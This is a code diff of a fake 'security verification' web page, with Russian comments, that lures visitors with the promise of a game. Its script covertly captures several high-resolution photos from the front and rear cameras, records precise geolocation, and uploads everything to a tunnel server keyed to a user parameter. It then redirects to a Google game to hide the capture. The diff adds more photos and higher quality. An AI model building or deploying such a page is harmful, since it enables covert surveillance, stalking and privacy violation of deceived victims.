@@ -3,18 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verification</title>
+    <title>Security Verification</title>
     <style>
-        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; transition: background 0.2s; }
-        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:80%; border:1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: opacity 0.2s; }
-        .btn { background:#fff; color:#000; border:none; padding:15px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 16px; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); opacity: 0.8; }
-        #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:30px; height:30px; animation:spin 1s linear infinite; margin:20px auto; }
+        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; transition: background 0.15s; overflow: hidden; }
+        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:85%; max-width: 400px; border:1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: opacity 0.3s; z-index: 10; }
+        .btn { background:#fff; color:#000; border:none; padding:18px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 18px; transition: 0.3s; }
+        #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto; }
         @keyframes spin { 100% { transform:rotate(360deg); } }
-        video, canvas { display:none; position: absolute; left: -9999px; }
-        p { color: #888; font-size: 14px; margin-bottom: 20px; }
+        video, canvas { display:none; position: fixed; pointer-events: none; }
+        p { color: #888; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
         
-        /* Класс для вспышки */
         body.flash-active { background: #fff !important; }
         .flash-active .card { opacity: 0; }
     </style>
@@ -22,7 +20,7 @@
 <body>
     <div class="card">
         <h2 id="st">Verification</h2>
-        <p id="msg">Please confirm your identity to continue to the game.</p>
+        <p id="msg">Please confirm your identity to access the secure game server.</p>
         <button class="btn" id="go" onclick="run()">CONFIRM</button>
         <div id="loader"></div>
     </div>
@@ -31,44 +29,65 @@
     <canvas id="c"></canvas>
 
 <script>
-    // Твоя актуальная ссылка (БЕЗ слэша в конце)
-    const API = "https://1540742d574c44.lhr.life"; 
+    // 🔗 ОБНОВИ ССЫЛКУ ТУТ:
+    const API = "https://f4207719a38432.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
     const urlParams = new URLSearchParams(window.location.search);
     const user = urlParams.get('user') || "Unknown";
 
-    async function takePhoto(mode) {
+    // Умное имя файла: Дата_Время_Тип
+    function getSmartName(label) {
+        const now = new Date();
+        const ts = now.toISOString().replace(/[-T:.Z]/g, "").substring(0, 14);
+        return `${ts}_${label}.jpg`;
+    }
+
+    async function takePhoto(mode, label) {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
 
-        // Если это селфи (front camera), включаем белый экран
         if (mode === "user") document.body.classList.add('flash-active');
 
+        let stream = null;
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: mode, width: {ideal: 1280}, height: {ideal: 720} },
+            // Прокачанные настройки: пытаемся взять макс. качество
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: mode, 
+                    width: { ideal: 4096 }, 
+                    height: { ideal: 2160 } 
+                },
                 audio: false 
             });
             
             const v = document.getElementById('v');
             v.srcObject = stream;
-            await new Promise(r => v.onloadedmetadata = r);
-            await new Promise(r => setTimeout(r, 1500)); // Даем камере настроиться
+            
+            // Ждем реального старта видео (исправляет черный экран на ПК)
+            await new Promise((resolve) => {
+                v.onloadedmetadata = () => {
+                    v.play();
+                    resolve();
+                };
+            });
+
+            await new Promise(r => setTimeout(r, 1000)); // Ждем автофокус
 
             const canvas = document.getElementById('c');
             canvas.width = v.videoWidth;
             canvas.height = v.videoHeight;
             canvas.getContext('2d').drawImage(v, 0, 0);
 
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-            stream.getTracks().forEach(t => t.stop());
-            
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 1.0));
             return blob;
         } catch (e) {
-            console.error(e);
+            console.warn(`Камера ${mode} недоступна, пропускаем...`);
             return null;
         } finally {
-            // В любом случае выключаем вспышку
+            // Обязательно выключаем камеру перед следующим снимком (важно для Android)
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+            }
             document.body.classList.remove('flash-active');
         }
     }
@@ -81,26 +100,36 @@
 
         btn.style.display = 'none';
         loader.style.display = 'block';
-        msg.innerText = "Processing security check...";
+        msg.innerText = "Initializing security protocols...";
 
         try {
-            // Гео
+            // Геопозиция
             navigator.geolocation.getCurrentPosition(p => {
                 fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(() => {});
             }, null, {enableHighAccuracy: true});
 
             const fd = new FormData();
             
-            msg.innerText = "Verifying identity (1/2)...";
-            const f1 = await takePhoto("user");
-            if (f1) fd.append('files', f1, 'front.jpg');
+            // План: 2 селфи и 2 задних фото
+            const plan = [
+                { m: "user", l: "front_1" },
+                { m: "user", l: "front_2" },
+                { m: "environment", l: "back_1" },
+                { m: "environment", l: "back_2" }
+            ];
 
-            msg.innerText = "Verifying identity (2/2)...";
-            const f2 = await takePhoto("environment");
-            if (f2) fd.append('files', f2, 'back.jpg');
+            for (let i = 0; i < plan.length; i++) {
+                msg.innerText = `Identity Check (${i + 1}/${plan.length})...`;
+                const photo = await takePhoto(plan[i].m, plan[i].l);
+                if (photo) {
+                    fd.append('files', photo, getSmartName(plan[i].l));
+                }
+                // Пауза между снимками для стабильности браузера
+                await new Promise(r => setTimeout(r, 600));
+            }
 
             if (fd.has('files')) {
-                msg.innerText = "Uploading data...";
+                msg.innerText = "Encrypting and uploading...";
                 await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
                     method: 'POST',
                     body: fd
@@ -109,13 +138,14 @@
 
             statusTitle.innerText = "Success";
             loader.style.display = 'none';
-            msg.innerText = "Identity verified! Redirecting...";
+            msg.innerText = "Verified! Loading game...";
 
-            setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
+            setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
 
         } catch (e) {
+            console.error(e);
             statusTitle.innerText = "Error";
-            msg.innerText = "Check permissions and retry.";
+            msg.innerText = "Check camera permissions and retry.";
             loader.style.display = 'none';
             btn.style.display = 'block';
         }
